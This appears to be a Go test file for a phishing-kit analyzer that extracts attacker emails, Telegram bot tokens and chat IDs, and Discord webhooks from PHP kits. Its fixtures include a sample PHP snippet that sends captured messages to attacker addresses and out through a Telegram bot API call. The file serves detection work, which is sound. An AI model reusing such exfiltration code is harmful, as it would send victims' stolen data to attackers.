package main

import (
	"archive/zip"
	"os"
	"path/filepath"
	"testing"
)

const samplePHPMailer = `<?php
$to = "victim-collector@attacker-mail.com";
$cc = "backup@attacker-mail.com";
mail($to, "got one", $message);

// pretend telegram exfil
$bot_token = "123456789:ABCdefGHIjklMNOpqrSTUvwxYZ0123456789";
$chat_id = "987654321";
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// discord variant
$webhook = "https://discord.com/api/webhooks/111222333444555666/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJ";
?>
`

const samplePHPWithPlaceholders = `<?php
// Common placeholders that should NOT count as indicators
$test = "test@test";
$example = "user@example.com";
$author = "yourname@your-domain.com";
$ok = "real-attacker@gmail.com";  // gmail IS real-attacker territory; keep it
?>
`

func TestAnalyzer_ScanExtractsAllIndicators(t *testing.T) {
	acc := newAnalyzer()
	acc.scan([]byte(samplePHPMailer))

	if len(acc.emails) != 2 {
		t.Errorf("expected 2 unique emails, got %v", sortedKeys(acc.emails))
	}
	for _, want := range []string{"victim-collector@attacker-mail.com", "backup@attacker-mail.com"} {
		if _, ok := acc.emails[want]; !ok {
			t.Errorf("missing expected email %q", want)
		}
	}
	if len(acc.tgBots) != 1 {
		t.Errorf("expected 1 telegram bot token, got %v", sortedKeys(acc.tgBots))
	}
	if len(acc.tgChats) != 1 {
		t.Errorf("expected 1 telegram chat id, got %v", sortedKeys(acc.tgChats))
	}
	if _, ok := acc.tgChats["987654321"]; !ok {
		t.Errorf("expected chat id 987654321")
	}
	if len(acc.discords) != 1 {
		t.Errorf("expected 1 discord webhook, got %v", sortedKeys(acc.discords))
	}
}

func TestAnalyzer_PlaceholderFiltering(t *testing.T) {
	acc := newAnalyzer()
	acc.scan([]byte(samplePHPWithPlaceholders))

	// real-attacker@gmail.com should be kept
	if _, ok := acc.emails["real-attacker@gmail.com"]; !ok {
		t.Error("gmail address should not be filtered as a placeholder")
	}
	// these should be filtered
	for _, ph := range []string{"test@test", "user@example.com", "yourname@your-domain.com"} {
		if _, ok := acc.emails[ph]; ok {
			t.Errorf("placeholder %q should have been filtered", ph)
		}
	}
}

func TestAnalyzer_DeduplicatesAcrossFiles(t *testing.T) {
	acc := newAnalyzer()
	acc.scan([]byte(samplePHPMailer))
	acc.scan([]byte(samplePHPMailer))
	acc.scan([]byte(samplePHPMailer))
	if len(acc.emails) != 2 {
		t.Errorf("dedup failed: got %d emails", len(acc.emails))
	}
}

func TestAnalyzePath_Zip(t *testing.T) {
	zipPath := buildTestZip(t, map[string]string{
		"index.php":       samplePHPMailer,
		"includes/lib.js": "// bot=" + `"999888777:zzzzZZZZyyyyYYYYxxxxXXXXwwwwWWWWvvvv"`,
		"assets/logo.png": "binary garbage — should be skipped",
		"readme.txt":      "Author: someone@attacker-mail.com",
	})
	r := AnalyzePath(zipPath)
	if r.SHA256 == "" {
		t.Error("expected SHA256 to be populated for a .zip input")
	}
	if r.FilesScanned < 2 {
		t.Errorf("expected at least 2 files scanned (php + js + txt), got %d", r.FilesScanned)
	}
	containsAll(t, r.Emails, "victim-collector@attacker-mail.com", "someone@attacker-mail.com")
	if len(r.TelegramBots) < 1 {
		t.Errorf("expected at least one TG bot token, got %v", r.TelegramBots)
	}
}

func TestAnalyzePath_Directory(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "mailer.php"), samplePHPMailer)
	mustWrite(t, filepath.Join(dir, "assets/style.css"), "body{color:red}")
	mustWrite(t, filepath.Join(dir, "results.txt"), "captured@victim-domain.org\npassword=hunter2")

	r := AnalyzePath(dir)
	if r.SHA256 != "" {
		t.Error("SHA256 should be empty for directory inputs")
	}
	if r.FilesScanned < 2 {
		t.Errorf("expected at least 2 files scanned, got %d (css should be skipped)", r.FilesScanned)
	}
	containsAll(t, r.Emails, "victim-collector@attacker-mail.com", "captured@victim-domain.org")
}

func TestAnalyzePath_MissingInput(t *testing.T) {
	r := AnalyzePath("/no/such/path/exists")
	if len(r.Errors) == 0 {
		t.Error("expected an error for missing input")
	}
}

func TestRelevantPath(t *testing.T) {
	cases := map[string]bool{
		"index.php":       true,
		"a/b/c.phtml":     true,
		"lib.js":          true,
		"page.html":       true,
		"data.txt":        true,
		"logo.png":        false,
		"font.woff2":      false,
		"style.css":       false,
		"binary":          false,
		"archive.zip":     false, // we don't recurse into nested zips
		"script.PHP":      true,  // case insensitive
	}
	for in, want := range cases {
		if got := relevantPath(in); got != want {
			t.Errorf("relevantPath(%q) = %v, want %v", in, got, want)
		}
	}
}

// --- helpers ---

func buildTestZip(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	p := filepath.Join(dir, "kit.zip")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	zw := zip.NewWriter(f)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return p
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func containsAll(t *testing.T, got []string, wants ...string) {
	t.Helper()
	set := make(map[string]bool, len(got))
	for _, g := range got {
		set[g] = true
	}
	for _, w := range wants {
		if !set[w] {
			t.Errorf("expected %q in result, got: %v", w, got)
		}
	}
}
